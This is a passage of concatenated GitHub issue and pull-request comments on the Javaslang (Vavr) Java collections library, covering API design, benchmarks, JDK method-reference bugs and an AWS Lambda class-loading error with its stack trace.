above - it shows the basic idea.\nNote2: Please take a look at the CONTRIBUTION.md regarding the order of methods (first new decls, then overrides, both sections (mostly) alphabetically ordered...). Hi @ashrko619,\nplease hold your horses :) We are already in the middle of something. For SortedSet the methods are on the way, for SortedMap it will be (hopefully) straightforward when SortedSet is finished.\n@eduardmanas has already implemented it for SortedSet, see PR #1317.\nIt is a very big PR with many changes to the internal core collection RedBlackTree, which is the base for sorted sets and maps. I've done some changes in a local branch but am still not finished.\nBecause we need a view on a RedBlackTree for the descending case, we need to simplify the type hierarchy of RedBlackTree. We will use null as internal representation for empty. But the public API still need an empty RedBlackTree. We can do this independent of this issue, so I created #1581.\n@eduardmanas Sorry for keeping the PR open for so long!\n. I think the PR's get too big. We should separate our changes. E.g. first PR: benchmarks, then additional PRs: improved List, improved Array, improved ...\n. What implications would these changes have for very big arrays? By using an offset, we cannot free the memory of an already allocated array, right?\n. I've spent more time on reading the code. Great changes!\n. Lovely, thank you!\n@eduardmanas Could we unify the code and use this result aggregator? Are any additions needed to match yours?\n. @eduardmanas Great ideas! I created #1328. Maybe I find some time to contribute...\n. Yes, running GC before an iteration makes sense.\n. Very nice and compact PR. Thank you!\n. Mmhh, interesting idea. We could do that!\n. Hi Nicolai, I like that kind of spam! More of that :)\nThanks for the links. I ran your code - also ok here (with the line commented out), using jdk1.8.0_74.\nSeems to be a jdk bug.\nBtw: I'm a big fan of your blog, great stuff!\n. @ruslansennov hold your horses (moving the tests). In the case of a jdk bug we should wait for a fix.\n. The tests in Nicolai's gist show that\n- it works for references to an instance method of a particular object containingObject::instanceMethodName\n- it does not work for references to an instance method of an arbitrary object of a particular type ContainingType::methodName\n(see Oracle Docs / Method References)\n. @ggalmazor yes, that's what I also thinking about - pulling the AbstractXxx classes out of the ~~collection~~ type hierarchy and provide static helper methods instead.\nEven if it is a JDK bug and it will be (or already is?) fixed in a future JDK version, it would be more robust to make it work independent of a specific JDK version.\n. Even if we rename the test packages we can't ensure that we make exhaustive tests by checking if all methods have sufficient visibility in sub-classes when used in conjunction with method references.\nAnother approach to test it would be to create a test class MethodReferenceTest that\n- reads all the public methods from all (public) types within all javaslang packages\n- creates a method reference using reflection / invoke dynamic / low level MethodHandle API\n- there are basically two different types: static method references and instance method references\n- I'm sure that we have to maintain an exception list / a whitelist of methods that we do not test...\nWe do not need to do this for release 2.1.0 because it is a nice to have test but it would help to make Javaslang more robust regarding further development.\nTowards release 2.1.0 we will look with a sharp eye if there are potential spots that may make problems. Candidates are our (new) abstract collection classes that are package private:\n- [x] AbstractBitSet(?) (update: this is compatible with method-references)\n- [x] AbstractMap\n- [ ] AbstractMultiMap\n- [ ] AbstractQueue\nBut these types should not introduce new API, I think there are public interfaces that already define the methods, so there should no IllegalAccessErrors occur. We will see...\n. Related to JDK Bug 8141122\n. (Found a JDK type inference bug on the way fixing the JDK bug of this issue. Details here: https://gist.github.com/danieldietrich/18902076d53ef09b5c90472b613be85b)\n. For now we stay backward-compatible to Java 8. Even Javaslang 3.0.0 will not be lifted to Java 9 as minimum version because there are no specific features we could use to make life easier for our users. Java 10 will be different :)\n. Yes, more fine-grained visibility features are very nice. What I still miss are sealed types, like in Scala. There are situation I need non-final, public types but want to prohibit that they are extended by types outside of the current scope.\n. Needs to be re-evaluated, if it is still a problem with Java 11.. In Vavr 1.0 we will not have non-visible abstract classes. Our inline code generator will inject shared code.. Hi Sheldon,\nwhat is your use-case?\n1. Developing Javaslang If you check out the sources from Github you do not need to modify your Maven settings. It should just work because Javaslang is on your local machine.\n2. Building a Javaslang snapshot from Sources on the local machine and referencing it from another local Maven Project If you do a mvn clean package the Javaslang snapshot is installed to your local maven repository. Other local maven projects that reference the Javaslang snapshot will load it from the local maven repository then. Here is also no sonatype sepcific configuration needed.\n3. Having a Javaslang snapshot dependency without having Javaslang sources checked out This is the use-case described in the Javaslang docs. The dependency has to be loaded from sonatype. The sonatype repository needs to be added either to the maven settings.xml or to the pom of the local project.\nIf your use-case is 3. then you should add the sonatype snapshot repo to your local pom or settings.xml.\nMaybe I should simplify the maven docs...\n. Great to hear, thanks!\n. Yep, I also think it can be closed. Let's wait for Eduard's answer.\n. Yes, I planned that. However, because of the lack of type constructors/higher kinded types in Java, we cannot implement it as instance method, it has to be a static method that takes the instance.\nI'm currently not sure how to implement flatten of interfaces like Seq.flatten(Seq). Applied to a List it should return a List instance, for a Queue a Queue instance and so on. I don't want to implement a big switch with different cases. That does not scale well...\n. Btw - a workaround is that.flatMap(Function.identity())\n. Duplicate to #241\n. I love it :) Also I'm impressed how deep you and @paplorinc went into the rabbit hole of benchmarking. My know-how is still basic here. Did scalaz disappear because of the version mismatch regarding scala?\n@eduardmanas the BenchmarkPerformanceReporter is intended to be a replacement for the BenchmarkResultAggregator, right? I think we should go with it and apply it to all benchmarks. @paplorinc is it ok for you? It is the emerged result of both of your works.\nI'm planning to create a blog post on the Javaslang blog about performance comparison using JMH. Is one of you (or maybe both of you teaming up?) interested in writing a guest blog post? Also we could create several post/parts of a series that covers the several collections... Ideas welcome :) The format is markdown, so it could be written in a private Gist.\n. > Sure, I'm interested, and it seems @eduardmanas is also.\nGreat, I'm looking forward to it!\nUpdate: I'm targeting June, maybe July ... depending of your time\n. It is more concise. Also it works for all Values. It might be confusing to stream an Option for example because java.util.stream.Stream is associated with collections.\n. I will think about it... we should only pull in changes that make sense.\n. Finished, we will keep it because they increase interoperability. In particular Collectors of other libraries can now be used in conjunction with Javslang. Many thanks @earlzero.\n. Nice work so far!\n. It would be nice if we have benchmarks for all methods of the performance table - just a thought. (midterm)\n. LveryGTM :-)\n. I question the use of assertions in benchmark code at all. We should not debug at all in benchmark code. If we think there is something wrong we should write a unit test or property test for that purpose. When we debug, the information gets lost. When we write a test, Javaslang gets hardened.\n. @eduardmanas @paplorinc Are there any open points left? If not I will merge it. Thx!\n. @eduardmanas yep, we will merge.\n. Great, thanks!\nYes, we have different categories of collections: Seq(uential), Map/Set ... and Tree and PriorityQueue.\nFor now it is ok to have PriorityQueue in the Seq section but I think we should create a Traversable or Other section midterm.\n. Thank you. I like possibilities! Looking forward to check it out...\n. Hi @benoitf,\nI opened the Developer Workspace. This repository contains a multi-module Maven project with additional source folders (src-gen). The java sources within the src-gen/main/java folder do not seem to be recognized by the Codenvy. Is this a known issue?\n. Thank you!\n. Great idea. I think we can simplify it a bit:\njava\nstatic <T> Stream<T> fromJavaStream(java.util.stream.Stream<? extends T> javaStream) {\n    return StreamFactory.create(javaStream.iterator());\n}\nor\njava\nstatic <T> Stream<T> ofAll(java.util.stream.Stream<? extends T> javaStream) {\n    return StreamFactory.create(javaStream.iterator());\n}\nStream.fromJavaStream makes it clear that a conversion takes place (we also have Validation.fromEither).\n. I tend also to ofAll. Because they are just a sequence of elements, like an Iterator or an Array.\n. Uh, oh \ud83d\ude31 \n(Thought: Javaslang 3.0.0 should be Java 9 ready. Replace our module hacks with real modules and internalize classes that are currently package-private, etc.)\n. There are still problems with Java 9. We will track this outside of this issue.\n. @ruslansennov We could add methods similar to these to our Maps (example: HashMap):\n``` java\nstatic  HashMap ofAll(\n        java.util.Stream<? extends T> stream,\n        Function<? super T, ? extends K> keyMapper,\n        Function<? super T, ? extends V> valueMapper) {\n    ...\n}\nstatic  HashMap ofAll(\n        java.util.Stream<? extends T> stream,\n        Function<? super T, Tuple2<? extends K, ? extends V>> f) {\n    ...\n}\n```\nAre other collections than Maps missing?\nWill defer this issue to 2.2.0.\n. @ruslansennov are still methods missing?. @nicholasren First of all: hold your horses. We currently can't start to implement 3.0.0, even if we create a branch to separate changes from the current master. In 2.1.0 there will be massive changes to the file structure. Package-private abstract collection classes may disappear and replaced by generated code of a new inline code generator. Merging all these changes in an ongoing, parallel 3.0.0 development (that will introduce breaking API changes) would be hell. Let's concentrate on 2.1.0 features first. There is plenty to do :)\n\nHowever, we observe that Scala uses a HashSet:\n```scala\nscala> val bitset = scala.collection.BitSet(1, 2, 3, 4, 5, 6, 7, 8, 9)\nbitset: scala.collection.BitSet = BitSet(1, 2, 3, 4, 5, 6, 7, 8, 9)\nscala> val unzipped = bitset.unzip(i => (i, i))\nunzipped: (scala.collection.Set[Int], scala.collection.Set[Int]) = (Set(5, 1, 6, 9, 2, 7, 3, 8, 4),Set(5, 1, 6, 9, 2, 7, 3, 8, 4))\nscala> unzipped\nres0: (scala.collection.Set[Int], scala.collection.Set[Int]) = (Set(5, 1, 6, 9, 2, 7, 3, 8, 4),Set(5, 1, 6, 9, 2, 7, 3, 8, 4))\nscala> unzipped.1.getClass()\nres1: Class[ <: scala.collection.Set[Int]] = class scala.collection.immutable.HashSet$HashTrieSet\n```\nat a first glance that looked somehow odd to me. A HashSet has no predictable order of elements. When unzipping a linked set or sorted set, I expect to keep the existing order.\nAs already mentioned in the description of this issue we don't know the comparators of the unzipped result of a sorted set, e.g.\njava\n// returns Tuple2<Integer, Set>, where Set is a HashSet\nSortedSet(1, 2, 3).unzip(i -> Tuple(i, new NotComparable(i)));\nHowever, a LinkedHashSet has insertion order, therefore the unzipped result may keep this order:\njava\n// returns Tuple2<Integer, Set>, where Set is a LinkedHashSet\nLinkedSet(1, 2, 3).unzip(i -> Tuple(i, new Foo(i)));\nThis implies that we will use the following Set implementations:\njava\nHashSet.unzip --> HashSet\nLinkedHashSet.unzip --> LinkedHashSet\nAnySortedSetImpl.unzip --> HashSet\n\nBtw - the same should be applicable to Map.unzip and Multimap.unzip. I will adjust the title of this issue.. Hi @Sir4ur0n,\nthis is an interesting (counter-)example. Please create a new issue!\nList is a 'sealed trait', so there cannot be sub-classes (see #1825).\nOther return types need to be declared using upper bounds (aka extends) in order to be able to adjust them when subclassing...\nWe will investigate what can be done. From what I can see we might remove the extends clause (and drop the ability to return more specific types in subclasses).. Here are many (all?) Seq methods that are effected:\njava\nSeq<? extends Seq<T>> combinations();\nSeq<? extends Seq<T>> combinations(int k);\nIterator<? extends Seq<T>> crossProduct(int power);\nSeq<? extends Seq<T>> permutations();\nTuple2<? extends Seq<T>, ? extends Seq<T>> splitAt(int n);\nTuple2<? extends Seq<T>, ? extends Seq<T>> splitAt(Predicate<? super T> predicate);\nTuple2<? extends Seq<T>, ? extends Seq<T>> splitAtInclusive(Predicate<? super T> predicate);\n<C> Map<C, ? extends Seq<T>> groupBy(Function<? super T, ? extends C> classifier);\nIterator<? extends Seq<T>> grouped(int size);\nOption<? extends Seq<T>> initOption();\nTuple2<? extends Seq<T>, ? extends Seq<T>> partition(Predicate<? super T> predicate);\nIterator<? extends Seq<T>> slideBy(Function<? super T, ?> classifier);\nIterator<? extends Seq<T>> sliding(int size);\nIterator<? extends Seq<T>> sliding(int size, int step);\nTuple2<? extends Seq<T>, ? extends Seq<T>> span(Predicate<? super T> predicate);\nOption<? extends Seq<T>> tailOption();\n<T1, T2> Tuple2<? extends Seq<T1>, ? extends Seq<T2>> unzip(Function<? super T, Tuple2<? extends T1, ? extends T2>> unzipper);\n<T1, T2, T3> Tuple3<? extends Seq<T1>, ? extends Seq<T2>, ? extends Seq<T3>> unzip3(Function<? super T, Tuple3<? extends T1, ? extends T2, ? extends T3>> unzipper);\n1) Falling back to Seq (No!)\nI think we can't fall back to Seq everywhere. For example the tailOption() of a Stream should return Option<Stream> instead of Option<Seq>.\n2) Using recursive self-type (No!)\nInstead of falling back to Seq return types we could add a generic self-type to each non-sealed collection interface - but this is not really an option for us:\n```java\ninterface Seq> {\nOption<M> tailOption();\n\n}\n```\nIn the case of unzip and unzip3 it wouldn't work and the user API would is a mess.\njava\nSet<String, ?> set = HashSet.empty();\nOption<Set<String, ?>> tail = set.tailOption();\n3) Leave API as-is\nLiving with additional ? extends ... declarations or using the narrow() function are the only viable solutions I see.\nExample:\n```java\nSet set = HashSet.empty();\n// does NOT compile\nTuple2, Set> unzip = set.unzip(s -> Tuple.of(\"\", \"\"));\n// DOES compile\nTuple2<? extends Set, ? extends Set> unzip1 = set.unzip(s -> Tuple.of(\"\", \"\"));\n// further processing results in nice types again\nSet first = unzip1._1;\nfinal Set apply = unzip1.apply((set1, set2) -> {\n    final Set s1 = set1.add(\"\");\n    final Set s2 = set2.add(\"\");\n    return s1.union(s2);\n});\n```\n\nWe should close ~~this issue~~ (and #2046).\nHowever, we should find a solution for methods that transform sorted collections (like SortedSet, SortedMap, ...) and return a (wrapped) self-type.\nFor example the unzip methods need to return a Set instead of a SortedSet (like we already stated above):\njava\n<T1, T2> Tuple2<? extends SortedSet<T1>, ? extends SortedSet<T2>> unzip(Function<? super T, Tuple2<? extends T1, ? extends T2>> unzipper);\n. Fixed with #1259\n. Duplicate, this will be part of #1493\n. Hi Eirik,\nthank you for your investigation. Indeed, Javaslang takes at least quadratic time to group the elements.\nWe need to understand how Java's Stream is implemented - it seems to me that it is lazy, even the Map that is returned. I will have a look.\nUsing a wrapper seems to be a viable option!\nGreets,\nDaniel\n. Very nice!\n. @povder no - just overseen it. Thanks for the hint!\n. @paplorinc Can this be closed?\n. Ok, thanks. Will take a look...\n. PriorityQueue will probably not part of Vavr 1. We want to focus on the most frequently used collections. Maybe we will release some kind of add-on collections package later.. Can be closed, master is stable next major version, minor and bugfix are branches/tags.\n. Hi all, let's leave the current PRs as-is. I will finish my review soon. After that a PR should be a small, focused unit of work.\n. Great, thank you!\n. Hi @earlzero, thank you for your contribution!\nI will add some comments regarding formatting to match the Javaslang code base style.\n. I've modified your code a bit and used StreamSupport, it does only depend on the underlying splitterator/iterator. For multi-valued types (like Traversable) we iterate the elements only once (instead of twice in the previous solution).\n``` java\n    /\n     * Collects the underlying value(s) (if present) using the provided {@code collector}.\n     \n     * @param collector Collector performing reduction\n     * @return R reduction result\n     /\n    default  R collect(Collector<? super T, A, R> collector) {\n        return StreamSupport.stream(spliterator(), false).collect(collector);\n    }\n/**\n * Collects the underlying value(s) (if present) using the given {@code supplier}, {@code accumulator} and\n * {@code combiner}.\n *\n * @param supplier    provide unit value for reduction\n * @param accumulator perform reduction with unit value\n * @param combiner    function for combining two values, which must be\n *                    compatible with the accumulator.\n * @return R reduction result\n */\ndefault <R> R collect(Supplier<R> supplier, BiConsumer<R, ? super T> accumulator, BiConsumer<R, R> combiner) {\n    return StreamSupport.stream(spliterator(), false).collect(supplier, accumulator, combiner);\n}\n\n```\nPlease use the formatting above, your formatter seems to differ from our IntelliJ IDEA settings (provided in this repo).\n. Please insert the code right behind the line\njava\n    // -- conversion methods\n. Thanks for your effort, I really appreciate it!\n. Hi @zsolt-donca,\nthank you for using Javaslang and reporting this bug! We will fix it soon in a 2.0.3 release.\nStoring the hash lazily for each node of a persistent collections may have a significant impact on memory (additional lazy objects and lambda instances), cpu (instance creation) and garbage collection, depending on the collection size.\nScala and Java do not store the hash, they also compute it every time hashCode is called.\nI think most users will not use (large) collections as keys. There is another option (beside making hash lazy in Javaslang):\nIt might be practicable to create a specific object-wrapper type that lazily provides the hash of the underlying object:\n``` java\npublic final class HashKey implements Serializable {\nprivate static final long serialVersionUID = 1L;\n\nprivate final K underlying;\nprivate transient Lazy<Integer> hash;\n\npublic static <K extends Serializable> HashKey<K> of(K underlying) {\n    return new HashKey<>(underlying);\n}\n\nprivate HashKey(K underlying) {\n    this.underlying = underlying;\n    this.hash = Lazy.of(() -> underlying.hashCode());\n}\n\npublic K underlying() {\n    return underlying;\n}\n\n@Override\npublic int hashCode() {\n    return hash.get();\n}\n\n@Override\npublic boolean equals(Object o) {\n    if (o == this) {\n        return true;\n    } else if (o instanceof HashKey) {\n        return underlying.equals(((HashKey) o).underlying());\n    } else {\n        return false;\n    }\n}\n\n// toString, readObject (initialize hash with a new Lazy), writeObject\n\n}\n```\nUsage:\n``` java\nMap map = HashMap.empty();\nHashKey> key = HashKey.of(map);\n// otherMap.put(key, value)\n```\nI'm currently not sure if such a type would fit well into Javaslang. But you might implement your own.\nWhat are your thoughts? Is that an option?\n. Hi @zsolt-donca, thank you.\nI think the wrapper keys should significantly improve the memory footprint since there is only one wrapper (+ Lazy + Supplier + Integer) for a whole collection instance. If the lazy instance would be baked into the collection, then every value/entry within the collection would have the overhead.\nI'm very interested in your insights/measurement. So it would be great if you share it here!\nThx!\n. No, please let's follow best practice from other langs like Scala.\nThe HashKey approach sketched above is O(1) mem and cpu.\n. I see. Let's not bake it into Javaslang for now.\n. @paplorinc We should concentrate for now on benchmark coverage of our basic methods (the ones shown in the javadoc performance table). Voxxed gave us the opportunity to write a series of articles on Javaslang.\nI'm sure that the benchmarks will be very interesting for the whole Java and Scala community!\nThis could be a game changer for collection libraries and also for the acceptance of persistent data structures. It would be awesome to see an article here by you!!\n. Already fixed, needs to be cherry-picked.\n. Thank you :)\n. Fixes #1354 \n. Thx!\n. Fixes #1265\n. Thank you!\n. Maybe this is the solution for dirty IO. I wrapped my head around adding in-methods while ensuring that resources are closed properly when combining streams.\njava.util.stream.Stream extends AutoClosable. Maybe Javaslang's Stream also needs to implement it when baking IO into it. But then composed Streams (like zipped Streams) need to close resources properly.\nIf one sub-Stream fails, all other sub-Streams need to close resources, too.\nI'm not sure that this impl is the correct way to do it. Will think about it...\n. > danieldietrich added the in progress label 2 days ago\nI think this may have to do with waffle.io and the new story board. Not sure. I did not added 'in progress' explicitly.\n. Couldn't effort the time to look into it, yet. Have to finish #1317 before. But I did not forget it...\n. ok, let me know if I can do sth\n. We track the big picture currently in milestone 2.2.0. However, I don't think there is a simple solution and I'm currently not sure if this feature should be baked into Javaslang.\nI will close this PR for now.\n. Wow, Scala's Iterate is fast. How is that difference?\n. @ruslansennov The label 'in progress' does mean, that a PR should not be merged, yet?\n. > But javaslang is faster (high score is good performance)!\nCool.\n\nThis label automatically added by github. I don't know what is means :)\n\nOh-kay. Seems to be a new feature!?\n. Great! Will merge now...\n. For now I will not further invest in vavr-test and keep it as-is because JUnit 5 is the 'defacto standard' and it offers property testing.. Please also update the performance table in javaslang/collection/package-info.java if necessary.\n. > Sorry, my opinion is that this PR should be rejected.\nYes, I also think that this is a major issue.\n. This PR is open for a while now. I share Ruslan's opinion that we should take memory consumption seriously.\nMemory sharing makes only sense if there are actual users of different parts of a collection that form a whole. But if we keep a whole HAMT but only a little part is used at all then this could be considered as memory leak. However, we still need one reference to prevent the garbage from being collected.\nWe should not try to provide hacks/optimizations to an existing algorithm. Over time the algorithm will be hard to maintain because its simplicity got lost. Instead we should consider to change the algorithm - by taking a look at how other (like Scala) solved the problem. @paplorinc provided a link to another Vector impl.\nWe should revert these change/close the PR. We should rewrite the whole Vector implementation without remorse if, and only if, we get an overall better performance. It does not make sense to rewrite it if we only get partial better results (for some methods) and others get worse.\nThe same applies to the recent Array changes.\n\nNote: In this PR not only Vector was changed but also Array. The Array changes should have been done in another PR.\nNote 2: During my office hours I'm not able to answer question (even not at gitter.im). I will come back once a day / in the evening (CET).\n. ~~I see the effort and the improvements that you've done with this PR and I really appreciate it. That's the reason I will pull it in. Please resolve the conflicts (see above) - then I will merge it (in the evening hours (CET)).~~\n~~We always have to move forward, not backward. If there are other caveats with the current impl we have to solve them, right? So keep on the great work (@all).~~\nUpdate: I talked to Ruslan - I haven't seen the whole picture. The only solution to get better performance without worsen the memory consumption is to exchange the implementation. We need to stay with the current Vector impl (and also with the previous Array impl).\nIf an optimal tail performance is needed, LinearSeq is the way to go. IndexedSeq are great at random access. We should not try to optimize linear characteristics in an indexed seq.\nI will close this PR now (and am really sad about it). If this PR contains changes that are not releated to slice and tail et al. we need to create an additional PR that contains them... sorry!\n. But isn't Ruslan's example (currently) valid?\njava\n// backing HAMT stays big\nVector<Integer> vect = Vector.range(0, 1_000_000).take(10)\n(will come back this evening)\n. Thank you!\n. Hi,\nthank you for reporting this!\nIs it an option for you to migrate to Javaslang 2.x, there it works.\nI remember you suggested some months ago to split Javaslang into smaller modules, right? Is that the reason that you stick to 1.x?\nGreets\nDaniel\n. I understand. We will fix it but it might need some time...\n. Related to #1326\n. Fixed with v1.2.3 - will be available at maven central later today\n. Many thanks, LGTM!\n. Great, thank you very much!\nPlease stay tuned regarding the other open PRs. I'm on a trip this weekend...\n. unfold should be provided for all Traversables(?), maybe as part of the Foldable interface. Currently you provided only an impl for List, right?\n^\n|\n|\n+--- Update: The sentences above are nonsense. Of course unfold is static and can't be part of Foldable.\n. Yes, I see the use cases, it makes perfectly sense to have it. The example @paplorinc provided is simpler in the sense of intermediate object creation but it is only a special case.\nHaskell provides dual methods unfold, unfoldLeft and unfoldRight for the methods fold, foldLeft, foldRight.\nWe should provide static methods unfold, unfoldLeft and unfoldRight for all Seq impls (i.e. not for Seq, LinearSeq and IndexSeq), namely CharSeq, Array, Vector, Queue, List and Stream.\nMy suggestion is to provide methods Iterator.unfold*. The Seq impls then just call Iterator.unfoldXxx(...).toList() for example.\n. We should only implement what makes sense, e.g. start with just unfold. You can decide it.\n\nlist left unfold would have disastrous performance.\n\nInteresting. I understand left/right unfold as dual to left/right fold. They should have same performance characteristics as their dual operations...\n. Ok. I will take also a look this weekend! Maybe I can provide some useful input...\n. Thank you, I will take an in-depth look this evening.\nI think the best place for the implementation might be the package-private javaslang.collection.Collections helper class instead of Iterator.\n. You are right. Location Iterator for impls is ok...\n. The code looks great. I've added comments about widening the function arguments. Please give me a hint if you think that could work.\n. Thank you!\n\n? extends Character is needed for it to type-check.\n\nok, LGTM\n\nthe last question is do we add an unfold besides unfoldLeft & unfoldRight\n\nYes. fold* is dual to unfold*, so we need unfold.\nfold is a simple version of foldLeft that operates  on values of same type. We find such methods everywhere, e.g.\nJava: Stream.reduce(BinaryOperator<T> accumulator)\nScala: GenTraversableOnce\nscala\n  def reduce[A1 >: A](op : scala.Function2[A1, A1, A1]) : A1\n  def reduceOption[A1 >: A](op : scala.Function2[A1, A1, A1]) : scala.Option[A1]\n  def fold[A1 >: A](z : A1)(op : scala.Function2[A1, A1, A1]) : A1\n  def /:[B](z : B)(op : scala.Function2[B, A, B]) : B\n  def :\\[B](z : B)(op : scala.Function2[A, B, B]) : B\n  def foldLeft[B](z : B)(op : scala.Function2[B, A, B]) : B\n  def foldRight[B](z : B)(op : scala.Function2[A, B, B]) : B\n\nComing back to the original question - the dual counterpart of fold looks like this:\n``` java\nT fold(T zero, BiFunction<? super T, ? super T, ? extends T> combine)\nstatic  ReturnType unfold(T seed, Function<? super T, Option>> f) {\n    return unfoldLeft(seed, f);\n}\n```\n. Well done, thank you!!\n. Thanks :)\n. Great, thank you! I have to apologize that I'm only able to react online in the evening hours...\n. Hard decision for me as there are two general opposed opinions by committers who do awesome work.\nI understand memory sharing in terms of sharing what is needed and not keeping what is not needed any more. Therefore I will pull it.\nThank you!\n. Thanks!\n. Fixes #1374 \n. Great!\nLet's call it putWith, it is shorter and indicates that it is put with a merge function.\nPlease move the implementation to AbstractMap. The complete Map type hierarchy needs methods with adjusted return types. Take a look at put to see an example.\n. > trust me, on the final issue you're preaching to the converted :)\nHaha, nice link :-))))\n. In Javaslang we use Map.merge for both cases. We have no Map.mergeWith. To be consistent we should use put for both cases and not putWith. Same applies to mapKeys.\n. Well done! This looks really nice now. Great addition.\n. @paplorinc Thank you for providing the list of non-public methods!\n\nI will commit the production code changes, without moving all the tests (let's do that when no PRs are pending).\n\nPlease let's keep the tests in the current packages. This is junit best practice and saves us from headaches when performing package-private test scenarios. We will keep an eye on the static methods in our code-reviews. In the worst case a new method is not visible for the end-user. This can be fixed.\n. @paplorinc Ok, I'm open minded to the idea of moving the test classes. Let's put the tests for classes a.b.c/* in a package a.b.c/test/.\n. There has been an issue with AWS Lambda in the past, which sounds similar.\nUnicode characters are part of the Java Spec. Maybe you need to set the encoding somewhere? Are you a windows user?\n. Hi @Pyeroh,\nI've created a maven-shade-plugin test project: javaslang-shade-test\nPlease check it out and follow the two build steps.\nIt works fine on my Mac. I need some feedback to further investigate this issue.\nPlease add some info on the build environment you use.\nThanks in advance,\nDaniel\n. Thank you! Very interesting.\nI've created the same test for Gradle: javaslang-shadow-test.\nAnd now the same error occurs on my machine.\nI think it is a shadow plugin error - I created an issue: johnrengelman/shadow#223\nI will close this issue because it is not a bug related to Javaslang.\n. Good to hear.\nHappy hacking!\n. suggested solution/workaround: https://github.com/johnrengelman/shadow/issues/223#issuecomment-237528182\n. @acmcelwee created a minimal failing test: https://github.com/acmcelwee/javaslang-shade-test/tree/aws-lambda\nOutput of AWS Lambda:\njavascript\n{\n  \"errorMessage\": \"java.lang.NoClassDefFoundError: javaslang/\u03bb\",\n  \"errorType\": \"java.lang.BootstrapMethodError\",\n  \"stackTrace\": [\n    \"javaslang.ShadeTest.myHandler(ShadeTest.java:8)\",\n    \"sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\",\n    \"sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\",\n    \"sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\",\n    \"java.lang.reflect.Method.invoke(Method.java:498)\"\n  ],\n  \"cause\": {\n    \"errorMessage\": \"javaslang/\u03bb\",\n    \"errorType\": \"java.lang.NoClassDefFoundError\",\n    \"stackTrace\": [\n      \"java.lang.ClassLoader.defineClass1(Native Method)\",\n      \"java.lang.ClassLoader.defineClass(ClassLoader.java:763)\",\n      \"java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)\",\n      \"java.net.URLClassLoader.defineClass(URLClassLoader.java:467)\",\n      \"java.net.URLClassLoader.access$100(URLClassLoader.java:73)\",\n      \"java.net.URLClassLoader$1.run(URLClassLoader.java:368)\",\n      \"java.net.URLClassLoader$1.run(URLClassLoader.java:362)\",\n      \"java.security.AccessController.doPrivileged(Native Method)\",\n      \"java.net.URLClassLoader.findClass(URLClassLoader.java:361)\",\n      \"java.lang.ClassLoader.loadClass(ClassLoader.java:424)\",\n      \"java.lang.ClassLoader.loadClass(ClassLoader.java:357)\",\n      \"javaslang.ShadeTest.myHandler(ShadeTest.java:8)\",\n      \"sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\",\n      \"sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\",\n      \"sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\",\n      \"java.lang.reflect.Method.invoke(Method.java:498)\"\n    ],\n    \"cause\": {\n      \"errorMessage\": \"javaslang.\u03bb\",\n      \"errorType\": \"java.lang.ClassNotFoundException\",\n      \"stackTrace\": [\n        \"java.net.URLClassLoader.findClass(URLClassLoader.java:381)\",\n        \"java.lang.ClassLoader.loadClass(ClassLoader.java:424)\",\n        \"java.lang.ClassLoader.loadClass(ClassLoader.java:357)\",\n        \"java.lang.ClassLoader.defineClass1(Native Method)\",\n        \"java.lang.ClassLoader.defineClass(ClassLoader.java:763)\",\n        \"java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)\",\n        \"java.net.URLClassLoader.defineClass(URLClassLoader.java:467)\",\n        \"java.net.URLClassLoader.access$100(URLClassLoader.java:73)\",\n        \"java.net.URLClassLoader$1.run(URLClassLoader.java:368)\",\n        \"java.net.URLClassLoader$1.run(URLClassLoader.java:362)\",\n        \"java.security.AccessController.doPrivileged(Native Method)\",\n        \"java.net.URLClassLoader.findClass(URLClassLoader.java:361)\",\n        \"java.lang.ClassLoader.loadClass(ClassLoader.java:424)\",\n        \"java.lang.ClassLoader.loadClass(ClassLoader.java:357)\",\n        \"javaslang.ShadeTest.myHandler(ShadeTest.java:8)\",\n        \"sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\",\n        \"sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\",\n        \"sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\",\n        \"java.lang.reflect.Method.invoke(Method.java:498)\"\n      ]\n    }\n  }\n}. Thanks for the update. I'm really looking forward to the test results!. @acmcelwee ping... :). Thank you! I would love to get some technical information from Amazon/AWS how they solved the problem. AWS is like a blackbox.... @acmcelwee I've looked again through this issue and saw that Gradle is used. There was another issue with Gradle that could be solved by setting the file.encoding system property either in JAVA_OPTS, GRADLE_OPTS or DEFAULT_JVM_OPTS. A short description can be found here.\nDo you think there is a chance that it could solve our issue here somehow? If so, could you test it with our test-repo?. @acmcelwee thank you for your support!. Sounds good.\n\nUnpredictable behavior may be only in HashMap#mapKeys(Function)\n\nIt is ok but has to be noted in the Javadoc\n. Hi @emmanueltouzery, thank you for your suggestion.\nI think the idea of @valery1707 is applicable to your use-case. With the addition of CheckedFunction.liftTry methods (see this comment) we have all we need.\nAdding a Try.lift that makes use of sequence would be too special.\nIf you agree we can close this issue.\n. Hi @valery1707, I like that idea!\nI have the following modifications of your initial idea in mind (these are non-static / default methods):\nFor N in {0, ..., 8}\njava\n* `CheckedFunctionN.recover(Function2<TupleN<T1, ..., TN>, ? super Throwable, ? extends R>)` - returns a `FunctionN`\n* `CheckedFunctionN.unchecked(Function<? super Throwable, ? extends RuntimeException>)` - returns a `FunctionN` that throws a `? extends RuntimeException`\n* `CheckedFunctionN.unchecked()` - returns a `FunctionN` that throws an `IllegalStateException`\nNote: recover needs to take a Tuple because 8 params + a Throwable arg exceeds max function arity (8).\nAdditionally we could provide static methods similar to lift (informal):\n- FunctionN<..., R>.liftTry(FunctionN<..., R>) that returns a FunctionN<..., Try<R>>\n- CheckedFunctionN<..., R>.liftTry(CheckedFunctionN<..., R>) that returns a FunctionN<..., Try<R>>\nThe code generator has to be changed because the CheckedFunctions are generated code. I can do that if you don't mind.\n. @mvh77 thanks for the input, you are absolutely right. I think there is nothing to do regarding Try and Future. I think in this case is less code better than adding special implicit behavior that complicates things. I will close this issue.\n. I will reopen this issue to think about it.\nIt is not only the InterruptedException. There might raise other problems when throwing Fatal exception, e.g. in the context of a Future:\n- Future is not completed with anything if it throws 